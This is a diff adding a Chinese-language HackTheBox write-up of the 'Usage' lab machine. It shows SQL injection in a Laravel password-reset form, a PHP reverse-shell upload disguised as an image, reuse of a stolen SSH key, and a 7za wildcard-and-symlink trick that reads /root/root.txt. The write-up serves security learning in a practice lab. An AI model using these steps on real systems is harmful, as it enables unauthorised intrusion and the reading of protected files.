@@ -1,13 +1,18 @@
 ---
-title: HackTheBox 笔记
+title: HackTheBox 笔记 - 1
 date: 2024-05-17 20:12:00
 tags: [Web, 渗透]
 categories: 渗透
 ---
 
 不得不找饭吃了。
+Two Million / Mailing / BoardLight / Usage
 
 <!--more-->
+
+## 配置
+
+国内访问比较慢，生成 VPN 的时候选 TCP，然后在下载的 `.ovpn` 文件里加一行 `http-proxy ip:port`，再用 `openvpn` 连接就行了，快很多。
 
 ## 新手村
 
@@ -589,13 +594,184 @@ echo -e "Done; Everything is clear ;)"
 中间的 `${file}` 那行不知道为啥断行了，给它三句连起来，记得加空格。
 在靶机执行拿到 root 的 shell，读 `root.txt` 拿到第二个 flag。
 
+## Usage
+
+扫端口只有 80 和 22，老样子，先加 host
+
+```bash
+sudo echo "10.10.11.18    http://usage.htb" >> /etc/hosts
+```
+
+然后访问，是一个登录页面，用 whatweb 看眼，发现是 Laravel
+
+```bash
+$ whatweb http://usage.htb/
+http://usage.htb/ [200 OK] Bootstrap[4.1.3], Cookies[XSRF-TOKEN,laravel_session], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)], HttpOnly[laravel_session], IP[10.10.11.18], Laravel, PasswordField[password], Title[Daily Blogs], UncommonHeaders[x-content-type-options], X-Frame-Options[SAMEORIGIN], X-XSS-Protection[1; mode=block], nginx[1.18.0]
+```
+
+在 [Hacktricks](https://book.hacktricks.xyz/v/cn/network-services-pentesting/pentesting-web/laravel) 上有说存在 SQL 注入漏洞，测一下
+先注册一个 `a@a.com` 的用户，再在重置密码的 `email` 项输入 `a@a.com'`，发现引号能触发 500 错误，说明存在注入。
+
+```sql
+a@a.com' AND 1=1;-- -
+```
+
+上面的语句的 response 是成功执行。于是把请求体复制到 request.txt，用 sqlmap 跑
+
+```yaml
+POST http://usage.htb/forget-password HTTP/1.1
+Host: usage.htb
+Content-Length: 84
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://usage.htb
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://usage.htb/forget-password
+Accept-Encoding: gzip, deflate, br
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: XSRF-TOKEN=eyJpdiI6IkhFakpQK2l4cU5sYkhHZzZoN00rUmc9PSIsInZhbHVlIjoiYysvaTY0WDl1dXBXMGR2TzM5YWt2aEg4T051akNzTDFxcWJzUC9yY3pPajN4ei9FRTRJbzNuQ2htY0pmc25xWGR5anV6UzFHTkJ1N2tYYWlJcUEzNjZnSmNVMzdaa0hWNWlST3BVeTlqUnpBdVJ0aEVlOTVUSnBlNXdTa29UTk8iLCJtYWMiOiI0NzIxOTRkMTk4ZWEyN2E2YjI1YTA1NzI4ODg3MzFjZWM0YjJkZGRhNTZjOWYxZGVkNmRjMWRkNTYyNzYzMjUwIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IktHWU1MYzFSNDBvSEN1M2dRSVJlTmc9PSIsInZhbHVlIjoib1FJU1RXWWxPV0ZRem5NNGJxUzR1QkdCdFpYMm8yWGxNblhFL0hIaFdnOWxSK3c0bStqNk9wY1Jsd3ZPZHFTTkdCWjByMnJNTkNnV21hZVJrZGZZcTdBbTFpT3YzOVBubENxT09FWTdBQlhPdEZoTGExMnZHdUZXZ0svOEF5cHkiLCJtYWMiOiI1NWNhNDg3OWZmOTEzNjkzNDMxZGNkZDVjODljMzBkMTRkYzcwZjU2MjI4ZDk5NTBkNzAxOTdhMzlkNTk3MzAxIiwidGFnIjoiIn0%3D
+Connection: close
+
+_token=KwTPctNAzmgzsn7wIgf7PC16p7nJ52U7AGT0MNHQ&email=a%40a.com # 注意这里用手注的 payload
+```
+
+<这里想起来就补>
+
+用 john 爆出密码 `whatever1`，在 `admin.usage.htb` 登录。
+发现没什么能做的，只有头像能改，测试只有前端有文件后缀校验，于是传一个 PHP 反弹 shell 的 png 上去，再用 burp 改成 .php 再传一次，刷新页面，拿到 shell。
+传 linpeas.sh 开扫，发现 `/home/dash/.ssh/id_rsa`，下到本地，登录
+
+```bash
+chmod 600 dash.pri  # 不然不给连
+ssh -i dash.pri dash@10.10.11.18
+```
+
+`/home/dash` 目录下有个 `.monitrc`，内容如下：
+
+```bash
+#Monitoring Interval in Seconds
+set daemon  60
+
+#Enable Web Access
+set httpd port 2812
+     use address 127.0.0.1
+     allow admin:3nc0d3d_pa$$w0rd
+
+#Apache
+check process apache with pidfile "/var/run/apache2/apache2.pid"
+    if cpu > 80% for 2 cycles then alert
+
+
+#System Monitoring
+check system usage
+    if memory usage > 80% for 2 cycles then alert
+    if cpu usage (user) > 70% for 2 cycles then alert
+        if cpu usage (system) > 30% then alert
+    if cpu usage (wait) > 20% then alert
+    if loadavg (1min) > 6 for 2 cycles then alert
+    if loadavg (5min) > 4 for 2 cycles then alert
+    if swap usage > 5% then alert
+
+check filesystem rootfs with path /
+       if space usage > 80% then alert
+```
+
+这里就藏着 xander 的密码 `3nc0d3d_pa$$w0rd`（感觉有点脑洞）
+登录后 `sudo -l` 看一眼，发现可以 `sudo /usr/bin/usage_management`，把文件拖下看用 IDA 看一眼
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [rsp+Ch] [rbp-4h] BYREF
+
+  puts("Choose an option:");
+  puts("1. Project Backup");
+  puts("2. Backup MySQL data");
+  puts("3. Reset admin password");
+  printf("Enter your choice (1/2/3): ");
+  __isoc99_scanf("%d", &v4);
+  if ( v4 == 3 )
+  {
+    resetAdminPassword();
+  }
+  else
+  {
+    if ( v4 > 3 )
+    {
+LABEL_9:
+      puts("Invalid choice.");
+      return 0;
+    }
+    if ( v4 == 1 )
+    {
+      backupWebContent();
+    }
+    else
+    {
+      if ( v4 != 2 )
+        goto LABEL_9;
+      backupMysqlData();
+    }
+  }
+  return 0;
+}
+```
+
+发现 `resetAdminPassword` 是用来消遣你的
+
+```c
+int resetAdminPassword()
+{
+  return puts("Password has been reset.");
+}
+void backupWebContent()
+{
+  if ( chdir("/var/www/html") )
+    perror("Error changing working directory to /var/www/html");
+  else
+    system("/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *");
+}
+int backupMysqlData()
+{
+  return system("/usr/bin/mysqldump -A > /var/backups/mysql_backup.sql");
+}
+```
+
+来分析一下这句命令
+
+```bash
+/usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *
+```
+
+`7za` 是 7zip 的命令行版本，`a` 是添加文件到压缩包，位置为 `/var/backups/project.zip`，`-tzip` 指定压缩格式为 zip，`-snl` 将符号链接作为链接存储，即不是压缩其指向的内容，`-mmt` 是多线程压缩，`--` 结束选项，`*` 压缩所有文件。
+[Hacktricks](https://book.hacktricks.xyz/v/cn/linux-hardening/privilege-escalation/wildcards-spare-tricks) 提到了利用这个的 trick，在 7z 中，`@` 开头的文件名会被当作文件列表，所以如下命令执行的时候 7z 会把 `root.txt` 当作文件列表，然后尝试对 `root.txt` 里列出的文件进行压缩
+
+```bash
+cd /var/www/html
+touch @root.txt
+ln -s /root/root.txt root.txt
+```
+
+然后再执行备份命令，就能在报错信息看到 root.txt 的内容了。
+
+> 软链接与硬链接
+  这里说一下软链接与硬链接的区别，软链接类似 Windows 中的快捷方式，可以跨越文件系统，硬链接则不行。所有硬链接，包括原文件指向的都是同一个 inode（索引节点），众生平等，除非只剩最后一个，否则删除一个硬链接不会影响其他硬链接，而软链接则不同，删除原文件会导致软链接失效。
+  生成方法上，软链接 `ln -s`；硬链接 `ln`，目录则需要 `cp -al /path/to/dir /path/to/link`。
+  一般来说，软链接用得多，硬链接用得少。
+
 ## 参考
 
+Two Million
 <https://h4r1337.github.io/posts/two-million/>
 <https://blog.csdn.net/song_lee/article/details/131245481>
-
+Mailing
 <https://blog.csdn.net/m0_52742680/article/details/138482768>
 <https://blog.csdn.net/whale_waves/article/details/138896310>
-
+BoardLight
 <https://blog.csdn.net/m0_52742680/article/details/139233464>
 <https://blog.csdn.net/2201_75526400/article/details/139304432>
+Usage
+<https://blog.csdn.net/zr1213159840/article/details/124548770>
+<https://amandaguglieri.github.io/hackinglife/htb-usage/>
